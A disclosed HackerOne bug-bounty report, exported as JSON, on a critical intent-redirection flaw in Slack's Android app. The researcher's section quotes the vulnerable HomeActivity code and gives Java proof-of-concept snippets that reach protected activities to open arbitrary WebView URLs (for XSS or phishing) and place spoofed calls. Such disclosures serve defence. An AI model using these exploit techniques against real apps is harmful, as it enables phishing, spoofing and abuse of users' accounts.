{
  "id": 200427,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDA0Mjc=",
  "url": "https://hackerone.com/reports/200427",
  "title": "Access of Android protected components via embedded intent",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2017-01-22T22:34:07.420Z",
  "submitted_at": "2017-01-22T22:34:07.420Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bagipro",
    "url": "/bagipro",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 69,
    "url": "https://hackerone.com/slack",
    "handle": "slack",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Slack",
      "twitter_handle": "slackhq",
      "website": "https://slack.com",
      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-07-17T23:34:56.039Z",
  "bug_reporter_agreed_on_going_public_at": "2017-06-20T13:41:06.171Z",
  "team_member_agreed_on_going_public_at": "2017-07-17T23:34:55.922Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-07-20T13:41:06.230Z",
  "allow_singular_disclosure_after": -257931748.6546428,
  "singular_disclosure_allowed": true,
  "vote_count": 28,
  "voters": [
    "sheikhrishad0",
    "whybee",
    "0d_amrr",
    "bl4de",
    "wisp",
    "alesandroortiz",
    "imranhudaa",
    "bobo_ka",
    "i5nipe",
    "kunal94",
    "and 18 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 4541,
      "category": "team",
      "content": "@bagipro found a vulnerability wherein a malicious and unprivileged app on the victim's phone could interact with any activity in the Slack Android app, allowing manipulation of the app in unintended ways. Thanks for the finding @bagipro!",
      "updated_at": "2017-06-22T00:36:06.304Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 16613,
        "username": "maxfeldman",
        "name": "Max Feldman",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "",
        "created_at": "2015-01-22T21:37:19.754Z",
        "url": "https://hackerone.com/maxfeldman",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
        }
      }
    },
    {
      "id": 4529,
      "category": "researcher",
      "content": "I found the following code inside ```com.Slack.ui.HomeActivity``` (exported activity, it means that any third-party app installed on the device/instant app can access it)\n```java\nprotected void onResume() {\n    // ...\n    handleIntentExtras(getIntent()); // attacker can pass anything to getIntent()\n}\n\nprivate void handleIntentExtras(Intent intent) {\n    // ...\n    Intent deeplinkIntent = (Intent) intent.getParcelableExtra(\"extra_deep_link_intent\");\n    //  ...\n    if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {\n        // ...\n        startActivity(deeplinkIntent); // danger! starting an intent provided by an attacker\n        // ...\n    }\n    // ...\n}\n```\nSo we get that ANY protected/not exported activity can be reached.\nHere is an example how it can be used against ```com.Slack.ui.WebViewActivity```, ***opening arbitrary link inside WebView***\n```java\nIntent next = new Intent();\nnext.setClassName(\"com.Slack\", \"com.Slack.ui.WebViewActivity\");\nnext.putExtra(\"extra_url\", \"http://example.com/\");\nnext.putExtra(\"extra_title\", \"test\");\n\nIntent start = new Intent();\nstart.setClassName(\"com.Slack\", \"com.Slack.ui.HomeActivity\");\nstart.putExtra(\"extra_deep_link_intent\", next);\n\nstartActivity(start);\n```\n\nIt could be used with ```javascript:``` scheme to trigger XSS, or perform fishing attacks (because users don't see the real URL, only the title provided by the attacker)\n\nResult:\n{F154295}\n\n***Making calls to real people***\n```java\nIntent next = new Intent(\"create\");\nnext.setClassName(\"com.Slack\", \"com.Slack.ui.CallActivity\");\nnext.putExtra(\"EXTRA_CALL_NAME\", \"Fake call name\");\nnext.putExtra(\"EXTRA_CALLER_ID\", \"U1RFBBPCP\");\nnext.putExtra(\"EXTRA_CHANNEL_NAME\", \"Fake channel name\");\nnext.putExtra(\"EXTRA_CHANNEL_ID\", \"D2B84FUFQ\");\nnext.putExtra(\"EXTRA_USERS_TO_INVITE\", new ArrayList<String>(Arrays.asList(new String[] { \"U2B81JBAL\" })));\n\nIntent start = new Intent();\nstart.setClassName(\"com.Slack\", \"com.Slack.ui.HomeActivity\");\nstart.putExtra(\"extra_deep_link_intent\", next);\n\nstartActivity(start);\n```\nResult:\n{F157904}\n\nWas able to perform other actions too like show fake comments and content, spoof received files (with social engineering could be used to force users to download any files provided by the attacker)",
      "updated_at": "2022-04-27T16:09:55.927Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 52239,
        "username": "bagipro",
        "name": "Sergey Toshin",
        "bio": "",
        "cleared": false,
        "verified": true,
        "website": "https://oversecured.com/",
        "location": "",
        "created_at": "2016-01-21T22:43:16.784Z",
        "url": "https://hackerone.com/bagipro",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
        }
      }
    }
  ]
}
